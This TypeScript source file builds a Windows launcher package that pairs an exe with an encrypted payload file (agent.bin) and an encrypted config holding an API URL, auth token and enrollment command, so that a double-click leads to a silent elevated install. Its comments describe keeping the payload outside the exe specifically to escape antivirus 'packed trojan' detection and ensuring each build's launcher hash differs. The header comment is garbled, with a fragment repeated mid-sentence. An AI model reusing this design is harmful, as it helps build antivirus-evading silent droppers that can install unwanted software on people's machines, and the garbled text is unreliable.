/**
 * launcher-build.ts — WP4 launcher-mode build path.
 *
 * Mirrors generator/launcher/dev/make-stamp.mjs byte-for-byte: takes one warm
 * launcher from the pool, seals a fresh per-build envelope
 * (K_B ‖ IV_PAY ‖ IV_CFG ‖ CK) with the launcher's compile-time seal, re-keys
 * the cached payload and builds the URL-query config under K_B, appends
 * [hdr][env][cfg][pay][trailer] to the pooled exe, writes the sibling agent.bin,
 * and zips the PORTABLE pair { Launcher.exe, agent.bin } into the job dir, then
 * runs the WP6 validation report card (server-side checks). Nothing is
 * downloaded or fetched at build time; the payload plaintext lives only in
 * memory.
 *
 * PORTABILITY (FIX 1, final): there is NO Update.lnk and NO baked path.
 * Launcher.exe is a requireAdministrator GUI PE that self-locates via its own
 * argv[0] and reads the sibling agent.bin from ITS O * argv[0] and reads the sibling agent.bin from ITS O  (Downloads/Desktop/...) and double-click Launcher.exe
 * -> UAC -> silent install. A relative .lnk does not resolve on this host
 * ("No application is associated") and an absolute .lnk bakes a user path
 * (fails for real users), so the exe-direct entry is the portable choice.
 */

import * as crypto from "crypto";
import * as fs from "fs";
import * as storage from "./storage";
import * as payloadCache from "./payload-cache";
import * as launcherPool from "./launcher-pool";
import { createZip } from "./zip-archive";
import { validateLauncherBuild } from "./launcher-validate";
import { HDR_LEN, ENV_LEN, assembleOverlay, buildAgentBin } from "./launcher-overlay";

export { HDR_LEN, ENV_LEN };

export interface LauncherBuildInputs {
  apiUrl: string;
  clientId: number;
  siteId: number;
  agentType: "workstation" | "server";
  authToken: string;
  features: string[];
  /** Enrollment command carried INSIDE the encrypted config (runbook reference). */
  enroll: string;
  /** Windows staging directory for the decoded payload. */
  outDir: string;
  /** Emit LAUNCHER-STAGE-OK after staging (observability; silent when false). */
  debug: boolean;
}

export interface LauncherRunOutput {
  zip: Buffer;
  stampedExe: Buffer;
  tag: string;
  launcherSha256: string;
  overlay: Buffer;
  configText: string;
}

// Per-build diversity tracking: a build whose stamped launcher byte-matches the
// previous build's (astronomically unlikely) is rejected.
let lastLauncherSha256: string | null = null;

function sha256Hex(data: Buffer): string {
  return crypto.createHash("sha256").update(data).digest("hex");
}

/** URL-query config wire format (values percent-encoded, mirrored in CfgGet). */
export function buildConfigString(c: LauncherBuildInputs): string {
  const enc = (s: string) => encodeURIComponent(s);
  return [
    `apiUrl=${enc(c.apiUrl)}`,
    `clientId=${enc(String(c.clientId))}`,
    `siteId=${enc(String(c.siteId))}`,
    `agentType=${enc(c.agentType)}`,
    `authToken=${enc(c.authToken)}`,
    `features=${enc(c.features.join(","))}`,
    `enroll=${enc(c.enroll)}`,
    `outDir=${enc(c.outDir)}`,
    `debug=${c.debug ? "1" : "0"}`,
  ].join("&");
}

/**
 * Run the launcher-mode build end-to-end for a job. The zip is written to
 * storage.zipOutputPath(jobId) and validated; on any failure it throws (the
 * caller cleans up the job dir).
 */
export async function runLauncherBuild(opts: {
  jobId: string;
  inputs: LauncherBuildInputs;
}): Promise<LauncherRunOutput> {
  const { jobId, inputs } = opts;

  // 1. warm launcher (compile-on-demand only when the pool is empty).
  const entry = await launcherPool.take();

  // 2. payload plaintext in memory ONLY (decrypts the cached blob, never
  //    persisted), then re-key under a fresh per-build K_B/IV_PAY.
  const plain = payloadCache.getPayloadBytes();
  const kb = crypto.randomBytes(32);
  const ivPay = crypto.randomBytes(16);
  const ivCfg = crypto.randomBytes(16);
  const payCipher = payloadCache.reKey(plain, kb, ivPay);

  // 3. config string + cipher (K_B/IV_CFG).
  const configText = buildConfigString(inputs);

  // 4. assemble the (EXTERNAL-payload) overlay + write the sibling agent.bin.
  //    Option A (AV): the payload ciphertext is NOT appended to Launcher.exe,
  //    so the PE stays a small low-entropy binary (no "tiny exe + 12 MB random
  //    blob = packed trojan" ML signature). Launcher reads agent.bin at runtime.
  const sealKey = Buffer.from(entry.sealKeyHex, "hex");
  const sealIv = Buffer.from(entry.sealIvHex, "hex");
  const overlay = assembleOverlay({
    sealKey,
    sealIv,
    kb,
    ivPay,
    ivCfg,
    configText,
    payload: plain,
    payloadCipher: payCipher,
    flags: 0,
    externalPayload: true,
  });
  const agentBin = buildAgentBin({
    sealKey,
    sealIv,
    kb,
    ivPay,
    ivCfg,
    configText,
    payload: plain,
    payloadCipher: payCipher,
    flags: 0,
    externalPayload: true,
  });
  const stampedExe = Buffer.concat([entry.exe, overlay]);
  if (!launcherPool.peIsGui(stampedExe)) {
    throw new Error(
      "stamped launcher is not a GUI-subsystem PE — build aborted"
    );
  }
  const launcherPath = storage.launcherOutputPath(jobId);
  const agentBinPath = storage.agentBinOutputPath(jobId);
  fs.writeFileSync(launcherPath, stampedExe);
  fs.writeFileSync(agentBinPath, agentBin);

  // 5. zip { Launcher.exe, agent.bin } — PORTABLE (no .lnk, no baked path).
  const zip = createZip([
    { name: "Launcher.exe", data: stampedExe },
    { name: "agent.bin", data: agentBin },
  ]);
  const zipPath = storage.zipOutputPath(jobId);
  fs.writeFileSync(zipPath, zip);

  // 6. WP6 validation report card (server-side checks).
  const lzHash = sha256Hex(stampedExe);
  const validation = await validateLauncherBuild({
    launcherPath,
    zipPath,
    authToken: inputs.authToken,
    payloadPlain: plain,
    sealKey,
    sealIv,
    agentBin,
    prevLauncherHash: lastLauncherSha256,
  });
  for (const row of validation.rows) console.log(`  [validate] ${row}`);
  if (!validation.ok) {
    throw new Error("Launcher build failed validation — job aborted");
  }
  // Task D: the zip is kept until expiry; drop the temp Launcher.exe + agent.bin.
  storage.removeLauncherTemp(jobId);
  lastLauncherSha256 = lzHash;

  console.log(
    `Launcher build ok for job ${jobId}; launcher=${stampedExe.length}B ` +
      `overlay=${overlay.length}B cfg=${configText.length}B zip=${zip.length}B ` +
      `tag=${entry.tag.slice(0, 8)}`
  );

  return {
    zip,
    stampedExe,
    tag: entry.tag,
    launcherSha256: lzHash,
    overlay,
    configText,
  };
}
